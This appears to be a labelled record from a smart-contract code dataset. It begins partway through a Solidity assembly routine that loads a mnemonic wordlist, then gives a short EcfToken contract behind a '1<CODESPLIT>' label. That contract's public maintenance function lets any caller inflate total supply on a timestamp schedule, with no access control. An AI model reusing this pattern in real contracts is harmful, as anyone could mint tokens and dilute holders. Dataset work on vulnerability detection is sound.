"editor")  mstore(add(toBytes, 1790), "effect")  mstore(add(toBytes, 1796), "either")  mstore(add(toBytes, 1802), "elect")  mstore(add(toBytes, 1808), "eleven")  mstore(add(toBytes, 1814), "elite")  mstore(add(toBytes, 1820), "elixir")  mstore(add(toBytes, 1826), "else")  mstore(add(toBytes, 1832), "email")  mstore(add(toBytes, 1838), "empire")  mstore(add(toBytes, 1844), "empty")  mstore(add(toBytes, 1850), "energy")  mstore(add(toBytes, 1856), "engine")  mstore(add(toBytes, 1862), "enjoy")  mstore(add(toBytes, 1868), "enough")  mstore(add(toBytes, 1874), "entire")  mstore(add(toBytes, 1880), "entity")  mstore(add(toBytes, 1886), "entry")  mstore(add(toBytes, 1892), "epic")  mstore(add(toBytes, 1898), "equal")  mstore(add(toBytes, 1904), "error")  mstore(add(toBytes, 1910), "escape")  mstore(add(toBytes, 1916), "euro")  mstore(add(toBytes, 1922), "event")  mstore(add(toBytes, 1928), "every")  mstore(add(toBytes, 1934), "evoke")  mstore(add(toBytes, 1940), "exact")  mstore(add(toBytes, 1946), "exam")  mstore(add(toBytes, 1952), "except")  mstore(add(toBytes, 1958), "excuse")  mstore(add(toBytes, 1964), "exit")  mstore(add(toBytes, 1970), "exotic")  mstore(add(toBytes, 1976), "expand")  mstore(add(toBytes, 1982), "expect")  mstore(add(toBytes, 1988), "extend")  mstore(add(toBytes, 1994), "extra")  mstore(add(toBytes, 2000), "fabric")  mstore(add(toBytes, 2006), "face")  mstore(add(toBytes, 2012), "famous")  mstore(add(toBytes, 2018), "fancy")  mstore(add(toBytes, 2024), "farm")  mstore(add(toBytes, 2030), "fast")  mstore(add(toBytes, 2036), "fault")  mstore(add(toBytes, 2042), "feel")  mstore(add(toBytes, 2048), "fence")  mstore(add(toBytes, 2054), "fiber")  mstore(add(toBytes, 2060), "field")  mstore(add(toBytes, 2066), "fifth")  mstore(add(toBytes, 2072), "figure")  mstore(add(toBytes, 2078), "film")  mstore(add(toBytes, 2084), "filter")  mstore(add(toBytes, 2090), "finder")  mstore(add(toBytes, 2096), "finish")  mstore(add(toBytes, 2102), "finite")  mstore(add(toBytes, 2108), "fire")  mstore(add(toBytes, 2114), "first")  mstore(add(toBytes, 2120), "fix")  mstore(add(toBytes, 2126), "flag")  mstore(add(toBytes, 2132), "flavor")  mstore(add(toBytes, 2138), "flex")  mstore(add(toBytes, 2144), "flight")  mstore(add(toBytes, 2150), "flip")  mstore(add(toBytes, 2156), "float")  mstore(add(toBytes, 2162), "floor")  mstore(add(toBytes, 2168), "floppy")  mstore(add(toBytes, 2174), "flora")  mstore(add(toBytes, 2180), "flower")  mstore(add(toBytes, 2186), "fly")  mstore(add(toBytes, 2192), "foam")  mstore(add(toBytes, 2198), "focus")  mstore(add(toBytes, 2204), "fog")  mstore(add(toBytes, 2210), "follow")  mstore(add(toBytes, 2216), "force")  mstore(add(toBytes, 2222), "forest")  mstore(add(toBytes, 2228), "fork")  mstore(add(toBytes, 2234), "format")  mstore(add(toBytes, 2240), "forum")  mstore(add(toBytes, 2246), "four")  mstore(add(toBytes, 2252), "fourth")  mstore(add(toBytes, 2258), "frame")  mstore(add(toBytes, 2264), "freeze")  mstore(add(toBytes, 2270), "fresh")  mstore(add(toBytes, 2276), "fridge")  mstore(add(toBytes, 2282), "friend")  mstore(add(toBytes, 2288), "front")  mstore(add(toBytes, 2294), "frozen")  mstore(add(toBytes, 2300), "fruit")  mstore(add(toBytes, 2306), "full")  mstore(add(toBytes, 2312), "fund")  mstore(add(toBytes, 2318), "funky")  mstore(add(toBytes, 2324), "fusion")  mstore(add(toBytes, 2330), "future")  mstore(add(toBytes, 2336), "fuzzy")  mstore(add(toBytes, 2342), "galaxy")  mstore(add(toBytes, 2348), "gamma")  mstore(add(toBytes, 2354), "garage")  mstore(add(toBytes, 2360), "garden")  mstore(add(toBytes, 2366), "garlic")  mstore(add(toBytes, 2372), "gas")  mstore(add(toBytes, 2378), "gate")  mstore(add(toBytes, 2384), "gene")  mstore(add(toBytes, 2390), "genius")  mstore(add(toBytes, 2396), "gentle")  mstore(add(toBytes, 2402), "get")  mstore(add(toBytes, 2408), "giant")  mstore(add(toBytes, 2414), "giga")  mstore(add(toBytes, 2420), "give")  mstore(add(toBytes, 2426), "glad")  mstore(add(toBytes, 2432), "glass")  mstore(add(toBytes, 2438), "global")  mstore(add(toBytes, 2444), "globe")  mstore(add(toBytes, 2450), "gnome")  mstore(add(toBytes, 2456), "goal")  mstore(add(toBytes, 2462), "gold")  mstore(add(toBytes, 2468), "gothic")  mstore(add(toBytes, 2474), "grade")  mstore(add(toBytes, 2480), "grand")  mstore(add(toBytes, 2486), "graph")  mstore(add(toBytes, 2492), "great")  mstore(add(toBytes, 2498), "green")  mstore(add(toBytes, 2504), "grid")  mstore(add(toBytes, 2510), "groove")  mstore(add(toBytes, 2516), "group")  mstore(add(toBytes, 2522), "grow")  mstore(add(toBytes, 2528), "guard")  mstore(add(toBytes, 2534), "guess")  mstore(add(toBytes, 2540), "guide")  mstore(add(toBytes, 2546), "guitar")  mstore(add(toBytes, 2552), "gulf")  mstore(add(toBytes, 2558), "gym")  mstore(add(toBytes, 2564), "haiku")  mstore(add(toBytes, 2570), "hair")  mstore(add(toBytes, 2576), "half")  mstore(add(toBytes, 2582), "hammer")  mstore(add(toBytes, 2588), "happen")  mstore(add(toBytes, 2594), "happy")  mstore(add(toBytes, 2600), "harbor")  mstore(add(toBytes, 2606), "have")  mstore(add(toBytes, 2612), "hawk")  mstore(add(toBytes, 2618), "hazel")  mstore(add(toBytes, 2624), "heavy")  mstore(add(toBytes, 2630), "height")  mstore(add(toBytes, 2636), "hello")  mstore(add(toBytes, 2642), "helmet")  mstore(add(toBytes, 2648), "help")  mstore(add(toBytes, 2654), "herb")  mstore(add(toBytes, 2660), "hide")  mstore(add(toBytes, 2666), "high")  mstore(add(toBytes, 2672), "hill")  mstore(add(toBytes, 2678), "hockey")  mstore(add(toBytes, 2684), "holder")  mstore(add(toBytes, 2690), "home")  mstore(add(toBytes, 2696), "honest")  mstore(add(toBytes, 2702), "honey")  mstore(add(toBytes, 2708), "honor")  mstore(add(toBytes, 2714), "horn")  mstore(add(toBytes, 2720), "hot")  mstore(add(toBytes, 2726), "hotel")  mstore(add(toBytes, 2732), "house")  mstore(add(toBytes, 2738), "huge")  mstore(add(toBytes, 2744), "human")  mstore(add(toBytes, 2750), "humor")  mstore(add(toBytes, 2756), "idea")  mstore(add(toBytes, 2762), "idle")  mstore(add(toBytes, 2768), "image")  mstore(add(toBytes, 2774), "impact")  mstore(add(toBytes, 2780), "import")  mstore(add(toBytes, 2786), "inbox")  mstore(add(toBytes, 2792), "inch")  mstore(add(toBytes, 2798), "indeed")  mstore(add(toBytes, 2804), "index")  mstore(add(toBytes, 2810), "indoor")  mstore(add(toBytes, 2816), "inn")  mstore(add(toBytes, 2822), "input")  mstore(add(toBytes, 2828), "inside")  mstore(add(toBytes, 2834), "intend")  mstore(add(toBytes, 2840), "intro")  mstore(add(toBytes, 2846), "invest")  mstore(add(toBytes, 2852), "invite")  mstore(add(toBytes, 2858), "iota")  mstore(add(toBytes, 2864), "iron")  mstore(add(toBytes, 2870), "island")  mstore(add(toBytes, 2876), "item")  mstore(add(toBytes, 2882), "jacket")  mstore(add(toBytes, 2888), "jaguar")  mstore(add(toBytes, 2894), "java")  mstore(add(toBytes, 2900), "jazz")  mstore(add(toBytes, 2906), "jewel")  mstore(add(toBytes, 2912), "job")  mstore(add(toBytes, 2918), "joint")  mstore(add(toBytes, 2924), "joke")  mstore(add(toBytes, 2930), "juice")  mstore(add(toBytes, 2936), "jungle")  mstore(add(toBytes, 2942), "karma")  mstore(add(toBytes, 2948), "keep")  mstore(add(toBytes, 2954), "kernel")  mstore(add(toBytes, 2960), "key")  mstore(add(toBytes, 2966), "kilo")  mstore(add(toBytes, 2972), "knee")  mstore(add(toBytes, 2978), "knock")  mstore(add(toBytes, 2984), "lab")  mstore(add(toBytes, 2990), "label")  mstore(add(toBytes, 2996), "labor")  mstore(add(toBytes, 3002), "lambda")  mstore(add(toBytes, 3008), "laptop")  mstore(add(toBytes, 3014), "large")  mstore(add(toBytes, 3020), "laser")  mstore(add(toBytes, 3026), "latex")  mstore(add(toBytes, 3032), "lawyer")  mstore(add(toBytes, 3038), "layout")  mstore(add(toBytes, 3044), "leaf")  mstore(add(toBytes, 3050), "league")  mstore(add(toBytes, 3056), "learn")  mstore(add(toBytes, 3062), "leave")  mstore(add(toBytes, 3068), "leg")  mstore(add(toBytes, 3074), "legacy")  mstore(add(toBytes, 3080), "legal")  mstore(add(toBytes, 3086), "legend")  mstore(add(toBytes, 3092), "lemon")  mstore(add(toBytes, 3098), "length")  mstore(add(toBytes, 3104), "lens")  mstore(add(toBytes, 3110), "lesson")  mstore(add(toBytes, 3116), "letter")  mstore(add(toBytes, 3122), "level")  mstore(add(toBytes, 3128), "lift")  mstore(add(toBytes, 3134), "lime")  mstore(add(toBytes, 3140), "limit")  mstore(add(toBytes, 3146), "linear")  mstore(add(toBytes, 3152), "lion")  mstore(add(toBytes, 3158), "liquid")  mstore(add(toBytes, 3164), "listen")  mstore(add(toBytes, 3170), "lobby")  mstore(add(toBytes, 3176), "locate")  mstore(add(toBytes, 3182), "logic")  mstore(add(toBytes, 3188), "logo")  mstore(add(toBytes, 3194), "lookup")  mstore(add(toBytes, 3200), "loop")  mstore(add(toBytes, 3206), "lord")  mstore(add(toBytes, 3212), "lotus")  mstore(add(toBytes, 3218), "lounge")  mstore(add(toBytes, 3224), "lucky")  mstore(add(toBytes, 3230), "lunar")  mstore(add(toBytes, 3236), "lunch")  mstore(add(toBytes, 3242), "luxury")  mstore(add(toBytes, 3248), "lyric")  mstore(add(toBytes, 3254), "magic")  mstore(add(toBytes, 3260), "magma")  mstore(add(toBytes, 3266), "magnet")  mstore(add(toBytes, 3272), "makeup")  mstore(add(toBytes, 3278), "manage")  mstore(add(toBytes, 3284), "manual")  mstore(add(toBytes, 3290), "map")  mstore(add(toBytes, 3296), "maple")  mstore(add(toBytes, 3302), "marble")  mstore(add(toBytes, 3308), "march")  mstore(add(toBytes, 3314), "margin")  mstore(add(toBytes, 3320), "marker")  mstore(add(toBytes, 3326), "mars")  mstore(add(toBytes, 3332), "mask")  mstore(add(toBytes, 3338), "master")  mstore(add(toBytes, 3344), "math")  mstore(add(toBytes, 3350), "matrix")  mstore(add(toBytes, 3356), "maybe")  mstore(add(toBytes, 3362), "mayor")  mstore(add(toBytes, 3368), "media")  mstore(add(toBytes, 3374), "meet")  mstore(add(toBytes, 3380), "member")  mstore(add(toBytes, 3386), "memory")  mstore(add(toBytes, 3392), "mentor")  mstore(add(toBytes, 3398), "menu")  mstore(add(toBytes, 3404), "merit")  mstore(add(toBytes, 3410), "mesh")  mstore(add(toBytes, 3416), "metal")  mstore(add(toBytes, 3422), "method")  mstore(add(toBytes, 3428), "metric")  mstore(add(toBytes, 3434), "micro")  mstore(add(toBytes, 3440), "middle")  mstore(add(toBytes, 3446), "mint")  mstore(add(toBytes, 3452), "minus")  mstore(add(toBytes, 3458), "minute")  mstore(add(toBytes, 3464), "mirror")  mstore(add(toBytes, 3470), "mixer")  mstore(add(toBytes, 3476), "mobile")  mstore(add(toBytes, 3482), "model")  mstore(add(toBytes, 3488), "modern")  mstore(add(toBytes, 3494), "modify")  mstore(add(toBytes, 3500), "module")  mstore(add(toBytes, 3506), "moment")  mstore(add(toBytes, 3512), "moon")  mstore(add(toBytes, 3518), "more")  mstore(add(toBytes, 3524), "motion")  mstore(add(toBytes, 3530), "motor")  mstore(add(toBytes, 3536), "mount")  mstore(add(toBytes, 3542), "movie")  mstore(add(toBytes, 3548), "much")  mstore(add(toBytes, 3554), "mud")  mstore(add(toBytes, 3560), "museum")  mstore(add(toBytes, 3566), "music")  mstore(add(toBytes, 3572), "name")  mstore(add(toBytes, 3578), "nano")  mstore(add(toBytes, 3584), "nation")  mstore(add(toBytes, 3590), "native")  mstore(add(toBytes, 3596), "nature")  mstore(add(toBytes, 3602), "need")  mstore(add(toBytes, 3608), "neon")  mstore(add(toBytes, 3614), "neuron")  mstore(add(toBytes, 3620), "never")  mstore(add(toBytes, 3626), "new")  mstore(add(toBytes, 3632), "nickel")  mstore(add(toBytes, 3638), "night")  mstore(add(toBytes, 3644), "ninja")  mstore(add(toBytes, 3650), "noble")  mstore(add(toBytes, 3656), "nobody")  mstore(add(toBytes, 3662), "noise")  mstore(add(toBytes, 3668), "norm")  mstore(add(toBytes, 3674), "normal")  mstore(add(toBytes, 3680), "north")  mstore(add(toBytes, 3686), "note")  mstore(add(toBytes, 3692), "notice")  mstore(add(toBytes, 3698), "notify")  mstore(add(toBytes, 3704), "novel")  mstore(add(toBytes, 3710), "number")  mstore(add(toBytes, 3716), "nylon")  mstore(add(toBytes, 3722), "oak")  mstore(add(toBytes, 3728), "oasis")  mstore(add(toBytes, 3734), "object")  mstore(add(toBytes, 3740), "oboe")  mstore(add(toBytes, 3746), "obtain")  mstore(add(toBytes, 3752), "ocean")  mstore(add(toBytes, 3758), "off")  mstore(add(toBytes, 3764), "office")  mstore(add(toBytes, 3770), "often")  mstore(add(toBytes, 3776), "oil")  mstore(add(toBytes, 3782), "olive")  mstore(add(toBytes, 3788), "omega")  mstore(add(toBytes, 3794), "online")  mstore(add(toBytes, 3800), "only")  mstore(add(toBytes, 3806), "open")  mstore(add(toBytes, 3812), "opera")  mstore(add(toBytes, 3818), "optic")  mstore(add(toBytes, 3824), "option")  mstore(add(toBytes, 3830), "oracle")  mstore(add(toBytes, 3836), "orange")  mstore(add(toBytes, 3842), "orbit")  mstore(add(toBytes, 3848), "order")  mstore(add(toBytes, 3854), "origin")  mstore(add(toBytes, 3860), "other")  mstore(add(toBytes, 3866), "outlet")  mstore(add(toBytes, 3872), "output")  mstore(add(toBytes, 3878), "oval")  mstore(add(toBytes, 3884), "own")  mstore(add(toBytes, 3890), "oxygen")  mstore(add(toBytes, 3896), "pad")  mstore(add(toBytes, 3902), "page")  mstore(add(toBytes, 3908), "paint")  mstore(add(toBytes, 3914), "palace")  mstore(add(toBytes, 3920), "panda")  mstore(add(toBytes, 3926), "panel")  mstore(add(toBytes, 3932), "pants")  mstore(add(toBytes, 3938), "paper")  mstore(add(toBytes, 3944), "parade")  mstore(add(toBytes, 3950), "park")  mstore(add(toBytes, 3956), "party")  mstore(add(toBytes, 3962), "pass")  mstore(add(toBytes, 3968), "pasta")  mstore(add(toBytes, 3974), "patio")  mstore(add(toBytes, 3980), "patrol")  mstore(add(toBytes, 3986), "peace")  mstore(add(toBytes, 3992), "pearl")  mstore(add(toBytes, 3998), "pencil")  mstore(add(toBytes, 4004), "pepper")  mstore(add(toBytes, 4010), "period")  mstore(add(toBytes, 4016), "permit")  mstore(add(toBytes, 4022), "pesto")  mstore(add(toBytes, 4028), "phone")  mstore(add(toBytes, 4034), "photo")  mstore(add(toBytes, 4040), "phrase")  mstore(add(toBytes, 4046), "piano")  mstore(add(toBytes, 4052), "pickup")  mstore(add(toBytes, 4058), "picnic")  mstore(add(toBytes, 4064), "piece")  mstore(add(toBytes, 4070), "pillow")  mstore(add(toBytes, 4076), "pilot")  mstore(add(toBytes, 4082), "pine")  mstore(add(toBytes, 4088), "pitch")  mstore(add(toBytes, 4094), "pixel")  mstore(add(toBytes, 4100), "pizza")  mstore(add(toBytes, 4106), "plain")  mstore(add(toBytes, 4112), "plant")  mstore(add(toBytes, 4118), "plate")  mstore(add(toBytes, 4124), "play")  mstore(add(toBytes, 4130), "plaza")  mstore(add(toBytes, 4136), "plenty")  mstore(add(toBytes, 4142), "plug")  mstore(add(toBytes, 4148), "pocket")  mstore(add(toBytes, 4154), "poem")  mstore(add(toBytes, 4160), "poker")  mstore(add(toBytes, 4166), "polar")  mstore(add(toBytes, 4172), "police")  mstore(add(toBytes, 4178), "polka")  mstore(add(toBytes, 4184), "pond")  mstore(add(toBytes, 4190), "pop")  mstore(add(toBytes, 4196), "post")  mstore(add(toBytes, 4202), "postal")  mstore(add(toBytes, 4208), "poster")  mstore(add(toBytes, 4214), "potato")  mstore(add(toBytes, 4220), "powder")  mstore(add(toBytes, 4226), "prefix")  mstore(add(toBytes, 4232), "press")  mstore(add(toBytes, 4238), "prism")  mstore(add(toBytes, 4244), "prize")  mstore(add(toBytes, 4250), "profit")  mstore(add(toBytes, 4256), "proof")  mstore(add(toBytes, 4262), "proper")  mstore(add(toBytes, 4268), "proud")  mstore(add(toBytes, 4274), "proxy")  mstore(add(toBytes, 4280), "pub")  mstore(add(toBytes, 4286), "public")  mstore(add(toBytes, 4292), "pulse")  mstore(add(toBytes, 4298), "pure")  mstore(add(toBytes, 4304), "purple")  mstore(add(toBytes, 4310), "puzzle")  mstore(add(toBytes, 4316), "python")  mstore(add(toBytes, 4322), "query")  mstore(add(toBytes, 4328), "quest")  mstore(add(toBytes, 4334), "queue")  mstore(add(toBytes, 4340), "quick")  mstore(add(toBytes, 4346), "quote")  mstore(add(toBytes, 4352), "rabbit")  mstore(add(toBytes, 4358), "radar")  mstore(add(toBytes, 4364), "radio")  mstore(add(toBytes, 4370), "rain")  mstore(add(toBytes, 4376), "random")  mstore(add(toBytes, 4382), "rapid")  mstore(add(toBytes, 4388), "rare")  mstore(add(toBytes, 4394), "reader")  mstore(add(toBytes, 4400), "ready")  mstore(add(toBytes, 4406), "realm")  mstore(add(toBytes, 4412), "recipe")  mstore(add(toBytes, 4418), "record")  mstore(add(toBytes, 4424), "reduce")  mstore(add(toBytes, 4430), "reef")  mstore(add(toBytes, 4436), "reform")  mstore(add(toBytes, 4442), "refund")  mstore(add(toBytes, 4448), "region")  mstore(add(toBytes, 4454), "relate")  mstore(add(toBytes, 4460), "relax")  mstore(add(toBytes, 4466), "reload")  mstore(add(toBytes, 4472), "remain")  mstore(add(toBytes, 4478), "remark")  mstore(add(toBytes, 4484), "remind")  mstore(add(toBytes, 4490), "remix")  mstore(add(toBytes, 4496), "remove")  mstore(add(toBytes, 4502), "renew")  mstore(add(toBytes, 4508), "repair")  mstore(add(toBytes, 4514), "repeat")  mstore(add(toBytes, 4520), "reply")  mstore(add(toBytes, 4526), "report")  mstore(add(toBytes, 4532), "rescue")  mstore(add(toBytes, 4538), "reset")  mstore(add(toBytes, 4544), "result")  mstore(add(toBytes, 4550), "resume")  mstore(add(toBytes, 4556), "retro")  mstore(add(toBytes, 4562), "return")  mstore(add(toBytes, 4568), "reveal")  mstore(add(toBytes, 4574), "review")  mstore(add(toBytes, 4580), "reward")  mstore(add(toBytes, 4586), "rhythm")  mstore(add(toBytes, 4592), "ribbon")  mstore(add(toBytes, 4598), "rice")  mstore(add(toBytes, 4604), "ring")  mstore(add(toBytes, 4610), "river")  mstore(add(toBytes, 4616), "road")  mstore(add(toBytes, 4622), "robot")  mstore(add(toBytes, 4628), "robust")  mstore(add(toBytes, 4634), "rock")  mstore(add(toBytes, 4640), "roll")  mstore(add(toBytes, 4646), "room")  mstore(add(toBytes, 4652), "rope")  mstore(add(toBytes, 4658), "route")  mstore(add(toBytes, 4664), "royal")  mstore(add(toBytes, 4670), "rubber")  mstore(add(toBytes, 4676), "ruby")  mstore(add(toBytes, 4682), "rule")  mstore(add(toBytes, 4688), "runner")  mstore(add(toBytes, 4694), "rural")  mstore(add(toBytes, 4700), "safari")  mstore(add(toBytes, 4706), "safe")  mstore(add(toBytes, 4712), "saga")  mstore(add(toBytes, 4718), "salad")  mstore(add(toBytes, 4724), "salary")  mstore(add(toBytes, 4730), "salmon")  mstore(add(toBytes, 4736), "salt")  mstore(add(toBytes, 4742), "sand")  mstore(add(toBytes, 4748), "saturn")  mstore(add(toBytes, 4754), "sauce")  mstore(add(toBytes, 4760), "sauna")  mstore(add(toBytes, 4766), "saver")  mstore(add(toBytes, 4772), "scale")  mstore(add(toBytes, 4778), "scene")  mstore(add(toBytes, 4784), "school")  mstore(add(toBytes, 4790), "scope")  mstore(add(toBytes, 4796), "scout")  mstore(add(toBytes, 4802), "screen")  mstore(add(toBytes, 4808), "script")  mstore(add(toBytes, 4814), "scroll")  mstore(add(toBytes, 4820), "scuba")  mstore(add(toBytes, 4826), "search")  mstore(add(toBytes, 4832), "season")  mstore(add(toBytes, 4838), "seat")  mstore(add(toBytes, 4844), "second")  mstore(add(toBytes, 4850), "secret")  mstore(add(toBytes, 4856), "secure")  mstore(add(toBytes, 4862), "see")  mstore(add(toBytes, 4868), "seeker")  mstore(add(toBytes, 4874), "self")  mstore(add(toBytes, 4880), "seller")  mstore(add(toBytes, 4886), "senate")  mstore(add(toBytes, 4892), "sense")  mstore(add(toBytes, 4898), "sensor")  mstore(add(toBytes, 4904), "sepia")  mstore(add(toBytes, 4910), "series")  mstore(add(toBytes, 4916), "serve")  mstore(add(toBytes, 4922), "setup")  mstore(add(toBytes, 4928), "seven")  mstore(add(toBytes, 4934), "severe")  mstore(add(toBytes, 4940), "shadow")  mstore(add(toBytes, 4946), "shape")  mstore(add(toBytes, 4952), "shark")  mstore(add(toBytes, 4958), "shield")  mstore(add(toBytes, 4964), "shine")  mstore(add(toBytes, 4970), "ship")  mstore(add(toBytes, 4976), "shirt")  mstore(add(toBytes, 4982), "shock")  mstore(add(toBytes, 4988), "shore")  mstore(add(toBytes, 4994), "shorts")  mstore(add(toBytes, 5000), "shower")  mstore(add(toBytes, 5006), "sigma")  mstore(add(toBytes, 5012), "sign")  mstore(add(toBytes, 5018), "signal")  mstore(add(toBytes, 5024), "silent")  mstore(add(toBytes, 5030), "silk")  mstore(add(toBytes, 5036), "silver")  mstore(add(toBytes, 5042), "simple")  mstore(add(toBytes, 5048), "singer")  mstore(add(toBytes, 5054), "site")  mstore(add(toBytes, 5060), "sixth")  mstore(add(toBytes, 5066), "sky")  mstore(add(toBytes, 5072), "slash")  mstore(add(toBytes, 5078), "slide")  mstore(add(toBytes, 5084), "smart")  mstore(add(toBytes, 5090), "smile")  mstore(add(toBytes, 5096), "smooth")  mstore(add(toBytes, 5102), "snow")  mstore(add(toBytes, 5108), "soccer")  mstore(add(toBytes, 5114), "sodium")  mstore(add(toBytes, 5120), "sofa")  mstore(add(toBytes, 5126), "solid")  mstore(add(toBytes, 5132), "solo")  mstore(add(toBytes, 5138), "solve")  mstore(add(toBytes, 5144), "song")  mstore(add(toBytes, 5150), "sonic")  mstore(add(toBytes, 5156), "sound")  mstore(add(toBytes, 5162), "soup")  mstore(add(toBytes, 5168), "source")  mstore(add(toBytes, 5174), "spa")  mstore(add(toBytes, 5180), "space")  mstore(add(toBytes, 5186), "speak")  mstore(add(toBytes, 5192), "speed")  mstore(add(toBytes, 5198), "spell")  mstore(add(toBytes, 5204), "sphere")  mstore(add(toBytes, 5210), "spin")  mstore(add(toBytes, 5216), "split")  mstore(add(toBytes, 5222), "spot")  mstore(add(toBytes, 5228), "spray")  mstore(add(toBytes, 5234), "spread")  mstore(add(toBytes, 5240), "spring")  mstore(add(toBytes, 5246), "square")  mstore(add(toBytes, 5252), "stack")  mstore(add(toBytes, 5258), "stamp")  mstore(add(toBytes, 5264), "star")  mstore(add(toBytes, 5270), "state")  mstore(add(toBytes, 5276), "static")  mstore(add(toBytes, 5282), "status")  mstore(add(toBytes, 5288), "step")  mstore(add(toBytes, 5294), "stereo")  mstore(add(toBytes, 5300), "still")  mstore(add(toBytes, 5306), "stone")  mstore(add(toBytes, 5312), "story")  mstore(add(toBytes, 5318), "strap")  mstore(add(toBytes, 5324), "stream")  mstore(add(toBytes, 5330), "street")  mstore(add(toBytes, 5336), "strong")  mstore(add(toBytes, 5342), "studio")  mstore(add(toBytes, 5348), "study")  mstore(add(toBytes, 5354), "stuff")  mstore(add(toBytes, 5360), "style")  mstore(add(toBytes, 5366), "submit")  mstore(add(toBytes, 5372), "sugar")  mstore(add(toBytes, 5378), "summer")  mstore(add(toBytes, 5384), "sunset")  mstore(add(toBytes, 5390), "super")  mstore(add(toBytes, 5396), "supply")  mstore(add(toBytes, 5402), "surf")  mstore(add(toBytes, 5408), "survey")  mstore(add(toBytes, 5414), "swap")  mstore(add(toBytes, 5420), "sweet")  mstore(add(toBytes, 5426), "swim")  mstore(add(toBytes, 5432), "swing")  mstore(add(toBytes, 5438), "switch")  mstore(add(toBytes, 5444), "sword")  mstore(add(toBytes, 5450), "symbol")  mstore(add(toBytes, 5456), "sync")  mstore(add(toBytes, 5462), "syntax")  mstore(add(toBytes, 5468), "syrup")  mstore(add(toBytes, 5474), "system")  mstore(add(toBytes, 5480), "table")  mstore(add(toBytes, 5486), "tail")  mstore(add(toBytes, 5492), "talent")  mstore(add(toBytes, 5498), "talk")  mstore(add(toBytes, 5504), "tango")  mstore(add(toBytes, 5510), "tape")  mstore(add(toBytes, 5516), "target")  mstore(add(toBytes, 5522), "taste")  mstore(add(toBytes, 5528), "taxi")  mstore(add(toBytes, 5534), "teach")  mstore(add(toBytes, 5540), "team")  mstore(add(toBytes, 5546), "techno")  mstore(add(toBytes, 5552), "ten")  mstore(add(toBytes, 5558), "tennis")  mstore(add(toBytes, 5564), "text")  mstore(add(toBytes, 5570), "theme")  mstore(add(toBytes, 5576), "theory")  mstore(add(toBytes, 5582), "thesis")  mstore(add(toBytes, 5588), "think")  mstore(add(toBytes, 5594), "third")  mstore(add(toBytes, 5600), "though")  mstore(add(toBytes, 5606), "thread")  mstore(add(toBytes, 5612), "throw")  mstore(add(toBytes, 5618), "ticket")  mstore(add(toBytes, 5624), "tiger")  mstore(add(toBytes, 5630), "tiny")  mstore(add(toBytes, 5636), "title")  mstore(add(toBytes, 5642), "token")  mstore(add(toBytes, 5648), "tomato")  mstore(add(toBytes, 5654), "topic")  mstore(add(toBytes, 5660), "total")  mstore(add(toBytes, 5666), "tower")  mstore(add(toBytes, 5672), "toy")  mstore(add(toBytes, 5678), "trace")  mstore(add(toBytes, 5684), "trader")  mstore(add(toBytes, 5690), "travel")  mstore(add(toBytes, 5696), "tray")  mstore(add(toBytes, 5702), "tree")  mstore(add(toBytes, 5708), "trend")  mstore(add(toBytes, 5714), "triple")  mstore(add(toBytes, 5720), "trivia")  mstore(add(toBytes, 5726), "truck")  mstore(add(toBytes, 5732), "trust")  mstore(add(toBytes, 5738), "truth")  mstore(add(toBytes, 5744), "tulip")  mstore(add(toBytes, 5750), "tune")  mstore(add(toBytes, 5756), "tunnel")  mstore(add(toBytes, 5762), "turn")  mstore(add(toBytes, 5768), "turtle")  mstore(add(toBytes, 5774), "two")  mstore(add(toBytes, 5780), "ultra")  mstore(add(toBytes, 5786), "under")  mstore(add(toBytes, 5792), "undo")  mstore(add(toBytes, 5798), "union")  mstore(add(toBytes, 5804), "unique")  mstore(add(toBytes, 5810), "unit")  mstore(add(toBytes, 5816), "unlock")  mstore(add(toBytes, 5822), "update")  mstore(add(toBytes, 5828), "upload")  mstore(add(toBytes, 5834), "upper")  mstore(add(toBytes, 5840), "urban")  mstore(add(toBytes, 5846), "use")  mstore(add(toBytes, 5852), "valid")  mstore(add(toBytes, 5858), "valley")  mstore(add(toBytes, 5864), "valve")  mstore(add(toBytes, 5870), "vector")  mstore(add(toBytes, 5876), "velvet")  mstore(add(toBytes, 5882), "vendor")  mstore(add(toBytes, 5888), "verbal")  mstore(add(toBytes, 5894), "verify")  mstore(add(toBytes, 5900), "vertex")  mstore(add(toBytes, 5906), "video")  mstore(add(toBytes, 5912), "view")  mstore(add(toBytes, 5918), "vinyl")  mstore(add(toBytes, 5924), "violin")  mstore(add(toBytes, 5930), "visit")  mstore(add(toBytes, 5936), "visual")  mstore(add(toBytes, 5942), "voice")  mstore(add(toBytes, 5948), "void")  mstore(add(toBytes, 5954), "volume")  mstore(add(toBytes, 5960), "wagon")  mstore(add(toBytes, 5966), "wall")  mstore(add(toBytes, 5972), "wallet")  mstore(add(toBytes, 5978), "walnut")  mstore(add(toBytes, 5984), "watch")  mstore(add(toBytes, 5990), "water")  mstore(add(toBytes, 5996), "web")  mstore(add(toBytes, 6002), "week")  mstore(add(toBytes, 6008), "wheat")  mstore(add(toBytes, 6014), "wheel")  mstore(add(toBytes, 6020), "white")  mstore(add(toBytes, 6026), "who")  mstore(add(toBytes, 6032), "width")  mstore(add(toBytes, 6038), "wiki")  mstore(add(toBytes, 6044), "wind")  mstore(add(toBytes, 6050), "window")  mstore(add(toBytes, 6056), "winter")  mstore(add(toBytes, 6062), "wisdom")  mstore(add(toBytes, 6068), "wish")  mstore(add(toBytes, 6074), "wizard")  mstore(add(toBytes, 6080), "wolf")  mstore(add(toBytes, 6086), "wonder")  mstore(add(toBytes, 6092), "wood")  mstore(add(toBytes, 6098), "worker")  mstore(add(toBytes, 6104), "world")  mstore(add(toBytes, 6110), "wrap")  mstore(add(toBytes, 6116), "wrist")  mstore(add(toBytes, 6122), "writer")  mstore(add(toBytes, 6128), "year")  mstore(add(toBytes, 6134), "yellow")  mstore(add(toBytes, 6140), "yoga")  mstore(add(toBytes, 6146), "zebra")  mstore(add(toBytes, 6152), "zero")  mstore(add(toBytes, 6158), "zinc")  mstore(add(toBytes, 6164), "zone")  mstore(add(toBytes, 6170), "zoo")}wordlist = toBytes;}}
1<CODESPLIT>contract EcfToken{    uint256 private lastUpdate;    uint256 private totalSupply;    function maintenance(uint256 amount) public {        require(block.timestamp > (lastUpdate+2592000));        require(amount <= (totalSupply/10));        totalSupply += amount;        return;    }}
